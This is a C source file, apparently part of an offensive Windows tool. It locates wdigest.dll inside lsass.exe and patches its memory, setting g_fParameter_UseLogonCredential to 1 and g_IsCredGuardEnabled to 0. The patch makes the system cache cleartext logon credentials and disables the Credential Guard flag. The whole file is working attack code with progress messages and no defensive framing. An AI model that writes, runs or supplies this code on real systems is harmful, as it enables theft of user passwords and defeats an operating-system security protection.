#include "Common.h"
#include <stdio.h>
#include <psapi.h>
#include <TlHelp32.h>

#pragma comment(lib, "version.lib")

// ----------------------------------------------------------------
// Global variables
// ----------------------------------------------------------------
WDIGEST_OFFSETS  g_WdigestOffsets = { 0 };

// ----------------------------------------------------------------
// Load offsets matching the running image versions
// ----------------------------------------------------------------
BOOL InitializeWdigestOffsets(VOID)
{
    CHAR   cszWdigestVersion[64] = { 0 };
    DWORD  dwIndex = 0;
    BOOL   bFound = FALSE;

    if (!GetRunningImageVersionString(L"wdigest", L"C:\\Windows\\System32\\wdigest.dll", L"dll", cszWdigestVersion, sizeof(cszWdigestVersion))) {
        printf("[!] GetRunningImageVersionString failed for wdigest.dll\n");
        return FALSE;
    }

    for (dwIndex = 0; dwIndex < WDIGEST_OFFSETS_COUNT; dwIndex++) {
        if (lstrcmpA(aWdigestOffsets[dwIndex].lpcszVersion, cszWdigestVersion) == 0) {
            g_WdigestOffsets = aWdigestOffsets[dwIndex];
            return TRUE;
        }
    }

    printf("[!] No wdigest offsets for version: %s\n", cszWdigestVersion);

    return FALSE;
}

// ----------------------------------------------------------------------------
// Get a handle of the target process
// ----------------------------------------------------------------------------
BOOL SearchProcess(LPWSTR lpwszProcessName, HANDLE* hProcess) {
    HANDLE hSnapshot = NULL;
    BOOL bStatus = FALSE;

    PROCESSENTRY32W ProcessEntry32 = { 0 };
    ProcessEntry32.dwSize = sizeof(PROCESSENTRY32W);

    // create snapshot to get all running processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot failed with error code: %lu\n", GetLastError());
        goto cleanup;
    }

    // get first process
    if (!Process32FirstW(hSnapshot, &ProcessEntry32)) {
        printf("[!] Process32FirstW failed with error code: %lu\n", GetLastError());
        goto cleanup;
    }

    // search for process
    do {
        // compare process name (case-insensitive)
        if (_wcsicmp(ProcessEntry32.szExeFile, lpwszProcessName) == 0)
        {
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessEntry32.th32ProcessID);

            if (*hProcess != NULL) {
                break;
            }
            else {
                DWORD dwError = GetLastError();

                if (dwError != ERROR_ACCESS_DENIED) {
                    printf("[!] OpenProcess failed with error code: %lu\n", GetLastError());
                    goto cleanup;
                }
            }
        }
    } while (Process32NextW(hSnapshot, &ProcessEntry32));

    if (*hProcess == NULL) {
        goto cleanup;
    }

    bStatus = TRUE;

cleanup:
    if (hSnapshot) {
        CloseHandle(hSnapshot);
    }

    return bStatus;
}

// ---------------------------------------------------------------------------
// Build "<imageName>_<build>-<revision>.<ext>" from the file version resource
// ---------------------------------------------------------------------------
BOOL GetRunningImageVersionString(
    _In_  LPCWSTR lpcwszImageName,
    _In_  LPCWSTR lpcwszSystemPath,
    _In_  LPCWSTR lpcwszExt,
    _Out_ PCHAR   pcszOutputBuffer,
    _In_  SIZE_T  cbOutputBuffer)
{
    VS_FIXEDFILEINFO* pFixedInfo = NULL;
    BOOL              bResult = FALSE;
    DWORD             dwHandle = 0;
    UINT              uLen = 0;
    WORD              wBuild = 0;
    WORD              wRevision = 0;
    DWORD             dwSize = 0;
    PBYTE             pbData = NULL;

    dwSize = GetFileVersionInfoSizeW(lpcwszSystemPath, &dwHandle);

    if (dwSize == 0) {
        printf("[!] GetFileVersionInfoSizeW failed with error: %lu\n", GetLastError());
        return FALSE;
    }

    pbData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)dwSize);

    if (pbData == NULL) {
        printf("[!] HeapAlloc failed\n");
        return FALSE;
    }

    if (!GetFileVersionInfoW(lpcwszSystemPath, dwHandle, dwSize, pbData)) {
        printf("[!] GetFileVersionInfoW failed with error: %lu\n", GetLastError());
    }
    else if (!VerQueryValueW(pbData, L"\\", (LPVOID*)&pFixedInfo, &uLen) || pFixedInfo == NULL) {
        printf("[!] VerQueryValueW failed with error: %lu\n", GetLastError());
    }
    else {
        wBuild = HIWORD(pFixedInfo->dwFileVersionLS);
        wRevision = LOWORD(pFixedInfo->dwFileVersionLS);

        wsprintfA(pcszOutputBuffer, "%S_%u-%u.%S", lpcwszImageName, wBuild, wRevision, lpcwszExt);

        bResult = TRUE;
    }

    HeapFree(GetProcessHeap(), 0, pbData);

    printf("[*] Version detected: %s\n", (LPCSTR)pcszOutputBuffer);

    return bResult;
}

// ----------------------------------------------------------------------------
// Enumerate modules in lsass.exe to locate wdigest.dll base address
// ----------------------------------------------------------------------------
BOOL FindWdigestInsideLsass(
    _In_  HANDLE     hProcess,
    _Out_ PULONG_PTR puWdigestBase
)
{
    HMODULE* phModules = NULL;
    DWORD      cbNeeded = 0;
    DWORD      dwModuleCount = 0;
    DWORD      dwIndex = 0;
    WCHAR      wcszModulePath[MAX_PATH] = { 0 };
    LPWSTR     lpwszFileName = NULL;
    MODULEINFO ModuleInfo = { 0 };
    BOOL       bResult = FALSE;

    // first call: get required buffer size
    EnumProcessModules(hProcess, NULL, 0, &cbNeeded);

    if (cbNeeded == 0) {
        printf("[!] EnumProcessModules failed with error: %lu\n", GetLastError());
        return FALSE;
    }

    phModules = (HMODULE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)cbNeeded);

    if (phModules == NULL) {
        printf("[!] HeapAlloc failed\n");
        return FALSE;
    }

    // second call: fill the buffer with module handles
    if (!EnumProcessModules(hProcess, phModules, cbNeeded, &cbNeeded)) {
        printf("[!] EnumProcessModules failed with error: %lu\n", GetLastError());
        goto cleanup;
    }

    dwModuleCount = cbNeeded / sizeof(HMODULE);

    for (dwIndex = 0; dwIndex < dwModuleCount; dwIndex++)
    {
        if (!GetModuleFileNameExW(hProcess, phModules[dwIndex], wcszModulePath, MAX_PATH)) {
            continue;
        }

        // extract the filename portion from the full path
        {
            PWSTR _p = wcszModulePath;
            lpwszFileName = NULL;
            while (*_p) { if (*_p == L'\\') lpwszFileName = _p; _p++; }
            lpwszFileName = (lpwszFileName != NULL) ? lpwszFileName + 1 : wcszModulePath;
        }

        if (lstrcmpiW(lpwszFileName, L"wdigest.dll") != 0) {
            continue;
        }

        if (!GetModuleInformation(hProcess, phModules[dwIndex], &ModuleInfo, sizeof(MODULEINFO))) {
            printf("[!] GetModuleInformation failed with error: %lu\n", GetLastError());
            goto cleanup;
        }

        *puWdigestBase = (ULONG_PTR)ModuleInfo.lpBaseOfDll;

        printf("[+] wdigest.dll found at: 0x%I64X\n", (ULONG64)*puWdigestBase);

        bResult = TRUE;

        break;
    }

    if (!bResult) {
        printf("[!] wdigest.dll not found in lsass.exe\n");
    }

cleanup:
    HeapFree(GetProcessHeap(), 0, phModules);

    return bResult;
}

// ----------------------------------------------------------------------------
// Patch g_fParameter_UseLogonCredentials to 1 and g_IsCredGuardEnabled to 0
// ----------------------------------------------------------------------------
BOOL PatchWdigestValues(
    _In_ HANDLE    hProcess,
    _In_ ULONG_PTR uWdigestBase
)
{
    ULONG_PTR uUseLogonCredentialVA = 0;
    ULONG_PTR uIsCredGuardEnabledVA = 0;
    DWORD     dwUseLogonCredential = 0;
    DWORD     dwIsCredGuardEnabled = 0;
    DWORD     dwPatchValue = 0;
    SIZE_T    cbRead = 0;
    NTSTATUS  STATUS = 0;

    uUseLogonCredentialVA = uWdigestBase + g_WdigestOffsets.ug_fParameter_UseLogonCredential;
    uIsCredGuardEnabledVA = uWdigestBase + g_WdigestOffsets.ug_IsCredGuardEnabled;

    if (!ReadProcessMemory(hProcess, (PVOID)uUseLogonCredentialVA, &dwUseLogonCredential, sizeof(DWORD), &cbRead)) {
        printf("[!] ReadProcessMemory failed for g_fParameter_UseLogonCredentials: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[*] g_fParameter_UseLogonCredentials: %lu\n", dwUseLogonCredential);

    // patching g_fParameter_UseLogonCredentials
    if (dwUseLogonCredential != 1) {
        dwPatchValue = 1;

        if (!WriteProcessMemory(hProcess, (PVOID)uUseLogonCredentialVA, &dwPatchValue, sizeof(DWORD), &cbRead)) {
            printf("[!] WriteProcessMemory failed for g_fParameter_UseLogonCredentials: %lu\n", GetLastError());
            return FALSE;
        }
        printf("[+] g_fParameter_UseLogonCredentials patched: %lu => 1\n", dwUseLogonCredential);
    }
    else {
        printf("[*] g_fParameter_UseLogonCredentials already set to 1\n");
    }

    if (g_WdigestOffsets.ug_IsCredGuardEnabled == 0) {
        printf("[*] g_IsCredGuardEnabled: not present in this wdigest version\n");
        return TRUE;
    }

    if (!ReadProcessMemory(hProcess, (PVOID)uIsCredGuardEnabledVA, &dwIsCredGuardEnabled, sizeof(DWORD), &cbRead)) {
        printf("[!] ReadProcessMemory failed for g_IsCredGuardEnabled: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[*] g_IsCredGuardEnabled: %lu\n", dwIsCredGuardEnabled);

    // patching g_IsCredGuardEnabled
    if (dwIsCredGuardEnabled != 0) {
        dwPatchValue = 0;

        if (!WriteProcessMemory(hProcess, (PVOID)uIsCredGuardEnabledVA, &dwPatchValue, sizeof(DWORD), &cbRead)) {
            printf("[!] WriteProcessMemory failed for g_IsCredGuardEnabled: %lu\n", GetLastError());
            return FALSE;
        }
        printf("[+] g_IsCredGuardEnabled patched: %lu => 0\n", dwIsCredGuardEnabled);
    }
    else {
        printf("[*] g_IsCredGuardEnabled already set to 0\n");
    }


    return TRUE;
}